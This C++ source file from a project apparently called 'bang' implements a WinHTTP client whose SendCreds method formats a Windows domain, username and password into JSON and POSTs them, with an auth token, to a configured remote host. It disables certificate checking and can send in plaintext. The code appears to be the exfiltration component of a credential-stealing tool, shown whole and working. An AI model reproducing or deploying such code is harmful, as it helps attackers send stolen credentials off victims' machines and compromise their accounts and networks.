#include <Windows.h>
#include <winhttp.h>

#include "bang_helpers.h"
#include "bang_http.h"

// enable TLS/HTTPS
#ifndef BANG_TLS_ENABLED
    #define BANG_TLS_ENABLED 0
#endif
#if !BANG_TLS_ENABLED
    #pragma message("*** WARNING: TLS/HTTPS is disabled for this build ***")
#endif

constexpr wchar_t c_ContentType[] = L"Content-Type: application/json; charset=utf-16\r\n";
constexpr wchar_t c_JsonTemplate[] =
    L"{\n"
    L"    \"auth_token\": \"%s\",\n"
    L"    \"domain\" : \"%s\",\n"
    L"    \"username\" : \"%s\",\n"
    L"    \"password\" : \"%s\"\n"
    L"}";

namespace bang
{
    // --- HTTP client --- //

    HttpClient::HttpClient(const wchar_t* hostname, const wchar_t* endpoint, const wchar_t* authtoken)
        : m_hostname(hostname), m_endpoint(endpoint), m_authtoken(authtoken)
    {
        m_session =
            WinHttpOpen(nullptr, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (m_session)
        {
            m_connection = WinHttpConnect(m_session, hostname, INTERNET_DEFAULT_PORT, 0);
            if (m_connection)
            {
                m_connected = true;
            }
        }
    }

    bool HttpClient::SendCreds(const wchar_t* domain, const wchar_t* username, const wchar_t* password)
    {
        if (!m_connected)
        {
            DEBUG_PRINTW(L"error: not connected\n");
            return false;
        }
        m_forbidden = false;

#if BANG_TLS_ENABLED
        DWORD req_flags = WINHTTP_FLAG_SECURE;
#else
        DWORD req_flags = 0;
#endif
        InternetHandle request = WinHttpOpenRequest(m_connection, L"POST", m_endpoint, nullptr, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, req_flags);
        if (request)
        {
#if BANG_TLS_ENABLED
            DWORD sec_flags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
            if (WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags)))
#endif
            {
                wchar_t json[MAX_PATH];
                bang::memset(json, 0, sizeof(json));

                wsprintfW(json, c_JsonTemplate, m_authtoken, domain, username, password);
                int json_len = lstrlenW(json) * sizeof(wchar_t);

                DEBUG_PRINTW(L"%s\n", json);

#pragma warning(suppress: 6385)
                if (WinHttpSendRequest(request, c_ContentType, -1L, json, json_len, json_len, NULL))
                {
                    if (WinHttpReceiveResponse(request, nullptr))
                    {
                        // only interested in status code
                        DWORD status = 0;
                        DWORD size = sizeof(status);
                        if (WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &size, WINHTTP_NO_HEADER_INDEX))
                        {
                            DEBUG_PRINTW(L"HTTP server response: %lu\n", status);
                            if (status == HTTP_STATUS_FORBIDDEN)
                            {
                                m_forbidden = true;
                            }
                            return status == HTTP_STATUS_OK;
                        }
                    }
                }
            }
        }

        DEBUG_PRINTW(L"failed to POST creds: 0x%lx\n", GetLastError());
        return false;
    }

}  // namespace bang